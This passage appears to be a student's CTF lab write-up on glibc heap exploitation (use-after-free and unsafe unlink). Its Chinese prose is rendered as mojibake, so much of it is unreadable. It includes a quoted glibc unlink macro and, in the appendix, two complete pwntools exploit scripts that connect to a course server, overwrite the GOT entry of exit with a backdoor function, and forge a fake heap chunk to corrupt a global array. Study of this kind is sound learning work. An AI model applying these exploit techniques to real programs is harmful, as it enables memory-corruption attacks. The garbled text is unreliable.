2. ç»äº†åŸæ¥æ˜¯çœŸæœ‰ä¸€ä¸ªå‡½æ•°å«backdoorï¼Œæˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±é€šè¿‡ROPçš„æ–¹æ³•å»æ„é€ ä¸€ä¸ªbackdoorï¼Œè¿˜ç ”ç©¶äº†åŠå¤©è¿™è¦æ€ä¹ˆå»æ”¹stackæ¥ä¼ å‚ã€‚ä¸‹æ¬¡çœ‹æºç è¦æ³¨æ„ã€‚

3. +8#16è€Œä¸æ˜¯+16#16æ˜¯å› ä¸ºmchunk_prev_sizeå¯ä»¥å’Œä¸Šä¸€ä¸ªçš„æœ€åå…«ä½å¤ç”¨

4. æ³¨æ„arrayå’Œarray[0]çš„ä¸åŒï¼š

    * ä¸è¡Œï¼š<img src="assets/image-20210527151419558.png" style="zoom: 80%;" /><img src="assets/image-20210527151428113.png" style="zoom: 80%;" />

    * å¯ä»¥ï¼š<img src="assets/image-20210527152145087.png" style="zoom:80%;" />

5. è®©`P->fd_nextsize`ä¸º0æ¥ç»•è¿‡é‚£ä¸€å—blockï¼Œæ‰€ä»¥ä¸å¦‚ä»¥åpayloadçš„å¡«å……éƒ½ç”¨'\\0'å¥½äº†

## Thoughts

### UAF

> UAFä¸­ä¸ºä»€ä¹ˆéœ€è¦freeä¸¤ä¸ªå—ç„¶åå†ç”¨Bçš„fdå‘¢ï¼Ÿåªfreeä¸€ä¸ªç„¶åç”¨Açš„fdä¸è¡ŒğŸ´ï¼Ÿ

å¯ä»¥ï¼Œä¿®æ”¹åçš„ä»£ç ä¸ºï¼š

```python
add_ddl_conn()
finish_ddl_conn(1)
edit_ddl_conn(1, p64(got_exit))
add_ddl_conn()
add_ddl_conn(p64(addr_backdoor))
exit_ddl_conn()
conn.interactive()
```

ä½†æ˜¯æœ€åä»å¾—addä¸¤ä¸ªddlï¼Œå› ä¸ºç¬¬ä¸€ä¸ªç”¨çš„æ˜¯freeæ‰çš„ï¼Œç¬¬äºŒä¸ªæ‰èƒ½èµ·åˆ°overwrite GOTè¡¨çš„ä½œç”¨ã€‚

ä¸è¿‡[é™„å½•](#exploit/uaf.py)ä¸­çš„è¿˜æ˜¯æŒ‰wikiæ¥å†™çš„ç‰ˆæœ¬ï¼Œé—®é¢˜ä¸å¤§ã€‚



> ä¸å€ŸåŠ©backdoorå‡½æ•°è€Œç”¨ROPçš„æ€è·¯æ¥åˆ°åº•æ˜¯å¦èƒ½exploitï¼Ÿï¼ˆæ„Ÿè§‰ç°å®ä¸­è¿™ç§backdooræ˜¾ç„¶æ˜¯ä¸å¯èƒ½å­˜åœ¨çš„ï¼‰

æ„Ÿè§‰éš¾åº¦æœ‰äº¿ç‚¹å¤§ï¼Œå› ä¸ºarrayæ˜¯åœ¨å †ä¸Šçš„ï¼Œè¦è°ƒç”¨system("/bin/sh")å¿…ç„¶å¾—æŠŠ"/bin/sh"æ”¾åˆ°æ ˆä¸Šï¼Œè¦ä¹ˆå°±overwriteè¶…é•¿è·ç¦»ä¸€ç›´åˆ°æ ˆä¸Šï¼Œä½†æ˜¯é¢˜ç›®åˆæœ‰1024çš„è¾“å…¥é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä¸å¯è¡Œçš„ã€‚

### Unsafe-Unlink

> æŒ‰ç…§wikiä¸­è¯´çš„è®¾è®¡payloadä¸ºä½•è¿˜æ˜¯ä¸èƒ½è®©finish 2nd ddlæ­£å¸¸ç»“æŸï¼Ÿ

é‡æ–°reference toæºç ï¼š

```c
#define NBINS 128
#define NSMALLBINS 64
#define SMALLBIN_WIDTH MALLOC_ALIGNMENT                                       // 16
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)                  // 16 > 16 = 0
#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)  // 1024 = 0x400

#define in_smallbin_range(sz) ((unsigned long)(sz) < (unsigned long)MIN_LARGE_SIZE)

#define unlink(AV, P, BK, FD)                                                    \
    {                                                                            \
        if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))       \
            malloc_printerr("corrupted size vs. prev_size");                     \
        FD = P->fd;                                                              \
        BK = P->bk;                                                              \
        if (__builtin_expect(FD->bk != P || BK->fd != P, 0))                     \
            malloc_printerr("corrupted double-linked list");                     \
        else {                                                                   \
            FD->bk = BK;                                                         \
            BK->fd = FD;                                                         \
            if (in_smallbin_range(chunksize_nomask(P)) &&                        \
                __builtin_expect(P->fd_nextsize != NULL, 0)) {                   \
                if (__builtin_expect(P->fd_nextsize->bk_nextsize != P, 0) ||     \
                    __builtin_expect(P->bk_nextsize->fd_nextsize != P, 0))       \
                    malloc_printerr("corrupted double-linked list (not small)"); \
                if (FD->fd_nextsize == NULL) {                                   \
                    if (P->fd_nextsize == P)                                     \
                        FD->fd_nextsize = FD->bk_nextsize = FD;                  \
                    else {                                                       \
                        FD->fd_nextsize             = P->fd_nextsize;            \
                        FD->bk_nextsize             = P->bk_nextsize;            \
                        P->fd_nextsize->bk_nextsize = FD;                        \
                        P->bk_nextsize->fd_nextsize = FD;                        \
                    }                                                            \
                } else {                                                         \
                    P->fd_nextsize->bk_nextsize = P->bk_nextsize;                \
                    P->bk_nextsize->fd_nextsize = P->fd_nextsize;                \
                }                                                                \
            }                                                                    \
        }                                                                        \
    }
```

ç”±äº0x5f0æ˜¾ç„¶æ˜¯å¤§äº0x400çš„ï¼Œå› æ­¤`!in_smallbin_range(chunksize_nomask(P))`ä¸º1ï¼Œè‹¥`__builtin_expect(P->fd_nextsize != NULL, 0)`å†ä¸º1ï¼Œå°±ä¼šè¿›å…¥ä¸‹ä¸€ä¸ªcode blockï¼Œå› æ­¤è¦è®©`P->fd_nextsize`ä¸ä¸º1ã€‚

# Appendix

## exploit/uaf.py

```python
import pwn
from pwnlib.util.packing import p64, u64
import code


pwn.context(arch='amd64', os='linux', log_level='INFO')

binary = pwn.ELF('./crackme/02_uaf/uaf')

got_exit = binary.got['exit']
addr_backdoor = binary.sym['backdoor']

conn = pwn.remote('47.99.80.189', 10030)
conn.recvuntil('ID:\n')
conn.sendline('3180103012')

# conn = pwn.process('crackme/02_uaf/uaf')


def add_ddl_conn(time: str = 'time', content: str = 'content'):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('1')
    conn.recvuntil('please input the ddl time\n')
    conn.sendline(time)
    conn.recvuntil('please input the ddl content\n')
    conn.sendline(content)


def finish_ddl_conn(index: int):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('2')
    conn.recvuntil('please input the ddl index\n')
    conn.sendline(str(index))


def edit_ddl_conn(index: int, time: str = 'time', content: str = 'content'):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('4')
    conn.recvuntil('please input the ddl index\n')
    conn.sendline(str(index))
    conn.recvuntil('please input the new ddl time\n')
    conn.sendline(time)
    conn.recvuntil('please input the new ddl content\n')
    conn.sendline(content)


def exit_ddl_conn():
    conn.recvuntil('Your chocie:\n')
    conn.sendline('5')
    conn.recvuntil('see you next time!\n')


add_ddl_conn()  # A
add_ddl_conn()  # B
add_ddl_conn()  # C


finish_ddl_conn(1)
finish_ddl_conn(2)


edit_ddl_conn(2, p64(got_exit))


add_ddl_conn()                    # D
add_ddl_conn(p64(addr_backdoor))  # E


exit_ddl_conn()

conn.interactive()
```

## exploit/unsafe_unlink.py

```python
import pwn
import pwnlib.util.packing
import code


def p64(x): return pwnlib.util.packing.pack(x, 64, sign=False)
def p192(x): return pwnlib.util.packing.pack(x, 192, sign=False)


pwn.context(arch='amd64', os='linux', log_level='INFO')

binary = pwn.ELF('./crackme/03_unsafe_unlink/unsafe_unlink')

DDL_CONTENT = 0x5d8

conn = pwn.remote('47.99.80.189', 10031)
conn.recvuntil('ID:\n')
conn.sendline('3180103012')

# conn = pwn.process('crackme/03_unsafe_unlink/unsafe_unlink')


def add_ddl_conn(time: str = 'time', content: str = 'content'):
    conn.sendlineafter('Your chocie:\n', '1')
    conn.sendlineafter('please input the ddl time\n', time)
    conn.sendlineafter('please input the ddl content\n', content)


def finish_ddl_conn(index: int):
    conn.sendlineafter('Your chocie:\n', '2')
    conn.sendlineafter('please input the ddl index\n', str(index))


def show_ddl_conn(index: int):
    conn.sendlineafter('Your chocie:\n', '3')
    conn.sendlineafter('please input the ddl index\n', str(index))


def edit_ddl_conn(index: int, time_nolf: str = 'time', content: str = 'content'):
    conn.sendlineafter('Your chocie:\n', '4')
    conn.sendlineafter('please input the ddl index\n', str(index))
    conn.sendafter('please input the new ddl time\n', time_nolf)
    conn.sendlineafter('please input the new ddl content\n', content)


def exit_conn():
    conn.sendlineafter('Your chocie:\n', '5')
    conn.recvuntil('see you next time!\n')


def check_conn():
    conn.sendlineafter('Your chocie:\n', '6')
    conn.recv()


add_ddl_conn()  # A
add_ddl_conn()  # B
add_ddl_conn()  # C


size_fake_chunk = 0x5f0
addr_targetID = binary.sym['targetID']  # 0x6020c0
addr_array = binary.sym['array']        # 0x6020e0
addr_array0 = 0x603260                  # = *addr_array

edit_ddl_conn(index=1,
              time_nolf=p64(addr_array0)     # *P == fake_chunk.mchunk_prev_size
              + p64(size_fake_chunk | 1)     # fake_chunk.mchunk_size (P=1)
              + p64(addr_array - 0x18)       # FD->bk == addr_array0
              + p64(addr_array - 0x10),      # BK->fd == addr_array0
              content=p64(0)                 # P->fd_nextsize
              + b'A' * (DDL_CONTENT - 0x10)  # ...
              + p64(size_fake_chunk))        # next_chunk.mchunk_prev_size


finish_ddl_conn(2)


# array[0][24] = array[0] = &targetID
edit_ddl_conn(index=1, time_nolf=p192(0x666)+p64(addr_targetID))

# array[0][0] = *(&targetID) = 3180103012
edit_ddl_conn(index=1, time_nolf=p64(3180103012) + b'\n')


check_conn()


conn.interactive()
```

## Reference

[ptmalloc â€“ sploitF-U-N (wordpress.com)](https://sploitfun.wordpress.com/tag/ptmalloc/)

[malloc.c - malloc/malloc.c - Glibc source code (glibc-2.27) - Bootlin](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3520)

[c - What is TCACHE? - Stack Overflow](https://stackoverflow.com/questions/49636591/what-is-tcache)

[off by null å°ç»“_ch3nwr1dçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_43409582/article/details/109825038)

[Off by Nullçš„å‰ä¸–ä»Šç”Ÿ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/208407)

[Off by one - CTF Wiki (x10sec.org)](https://wiki.x10sec.org/pwn/linux/glibc-heap/off_by_one/)

[Unlink Exploit - heap-exploitation (dhavalkapil.com)](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)

